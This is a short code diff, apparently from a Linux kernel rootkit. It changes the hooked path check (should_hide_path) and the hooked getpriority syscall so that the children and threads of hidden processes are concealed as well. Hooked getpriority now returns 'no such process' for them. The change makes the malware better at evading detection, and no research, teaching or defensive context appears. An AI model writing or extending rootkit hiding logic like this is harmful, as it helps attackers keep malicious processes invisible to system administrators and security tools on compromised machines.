@@ -43,7 +43,9 @@ notrace bool should_hide_path(const char __user *pathname)
         if (kstrtoint(pid_buf, 10, &pid) < 0)
             return false;
 
-        if (j > 0 && is_hidden_pid(pid)) {
+        if (j > 0 && (is_hidden_pid(pid) || is_child_pid(pid) || pid_is_thread(pid))) {
+            if (pid == (int)task_tgid_vnr(current))
+                return false;
             return true;
         }
     }
@@ -355,7 +357,7 @@ static notrace asmlinkage long hooked_sys_getpriority(const struct pt_regs *regs
     int who = regs->si;
 
     if (which == PRIO_PROCESS) {
-        if (is_hidden_pid(who))
+        if (is_hidden_pid(who) || is_child_pid(who) || pid_is_thread(who))
             return -ESRCH;
     }
 
